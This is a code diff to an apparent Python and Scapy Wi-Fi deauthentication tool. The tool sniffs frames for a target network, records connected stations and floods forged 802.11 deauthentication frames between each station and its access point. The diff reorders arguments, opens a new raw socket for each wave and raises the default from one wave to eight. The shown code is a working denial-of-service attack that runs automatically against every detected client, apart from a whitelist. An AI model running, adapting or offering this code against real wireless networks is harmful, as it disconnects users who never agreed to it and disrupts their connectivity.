@@ -110,31 +110,31 @@ def register_sta(wifi_essid, bssid_sta, bssid_ap, bssids_stas_dict):
     except Exception as e:
         raise MsgException(e, 'Detected station could not be registered')
 
-def unicast_deauth(wifi_interface, bssid_sta, bssid_ap, bssid_network, deauth_waves):
+def unicast_deauth(wifi_interface, deauth_waves, bssid_sta, bssid_ap, bssid_network):
     '''unicast deauthentication'''
     
     try:
-        unicast_deauth_socket = scapy_conf.L2socket(iface = wifi_interface)
         print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} deauthentication frames from AP {bssid_ap} to STA {bssid_sta} ...')
         print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} deauthentication frames from STA {bssid_sta} to AP {bssid_ap} ...')
         for i in range(deauth_waves):
+            deauth_socket = scapy_conf.L2socket(iface = wifi_interface)
             for i in range(DEAUTH_COUNT):
-                unicast_deauth_socket.send(
+                deauth_socket.send(
                     dot11.RadioTap() /
                     dot11.Dot11(addr1 = bssid_sta, addr2 = bssid_ap, addr3 = bssid_network) /
                     dot11.Dot11Deauth(reason = 7)
                 )
             for i in range(DEAUTH_COUNT):
-                unicast_deauth_socket.send(
+                deauth_socket.send(
                     dot11.RadioTap() /
                     dot11.Dot11(addr1 = bssid_ap, addr2 = bssid_sta, addr3 = bssid_network) /
                     dot11.Dot11Deauth(reason = 7)
                 )
-        unicast_deauth_socket.close()
+            deauth_socket.close()
     except Exception as e:
         raise MsgException(e, 'Deauthentication frames could not be sent')
 
-def sniffer_wrapper(wifi_interface, wifi_essid, deauth_waves, bssids_whitelist, bssids_aps_dict, bssids_stas_dict):
+def sniffer_wrapper(wifi_interface, wifi_essid, bssids_whitelist, deauth_waves, bssids_aps_dict, bssids_stas_dict):
     def sniffer_handler(frame):
         '''sniffed frame processing'''
         
@@ -168,10 +168,10 @@ def sniffer_wrapper(wifi_interface, wifi_essid, deauth_waves, bssids_whitelist, 
                 else:
                     if bssids_aps_dict.get(bssid_src) and (bssids_stas_dict.get(bssid_dst) != bssid_src) and is_unicast(bssid_dst):
                         register_sta(wifi_essid, bssid_dst, bssid_src, bssids_stas_dict)
-                        unicast_deauth(wifi_interface, bssid_dst, bssid_src, bssid_network, deauth_waves)
+                        unicast_deauth(wifi_interface, deauth_waves, bssid_dst, bssid_src, bssid_network)
                     elif bssids_aps_dict.get(bssid_dst) and (bssids_stas_dict.get(bssid_src) != bssid_dst):
                         register_sta(wifi_essid, bssid_src, bssid_dst, bssids_stas_dict)
-                        unicast_deauth(wifi_interface, bssid_src, bssid_dst, bssid_network, deauth_waves)
+                        unicast_deauth(wifi_interface, deauth_waves, bssid_src, bssid_dst, bssid_network)
         
         except Exception as e:
             raise MsgException(e, 'Sniffed frames could not be processed')
@@ -195,20 +195,20 @@ def main():
             required = True,
         )
         parser.add_argument(
-            '-n',
-            dest = 'deauth_waves',
-            help = 'Number of deauthentication waves',
-            required = False,
-            type = int,
-            default = 1,
-        )
-        parser.add_argument(
             '-wl',
             dest = 'bssids_whitelist',
             help = 'Comma-separated BSSIDs whitelist',
             required = False,
             type = bssids_whitelist_type,
             default = [],
+        )
+        parser.add_argument(
+            '-n',
+            dest = 'deauth_waves',
+            help = 'Number of deauthentication waves',
+            required = False,
+            type = int,
+            default = 8,
         )
         args = parser.parse_args()
         bssids_aps_dict = {} # {ap bssid: network bssid}
@@ -224,8 +224,8 @@ def main():
             prn = sniffer_wrapper(
                 args.wifi_interface,
                 args.wifi_essid,
-                args.deauth_waves,
                 args.bssids_whitelist,
+                args.deauth_waves,
                 bssids_aps_dict,
                 bssids_stas_dict,
             ),
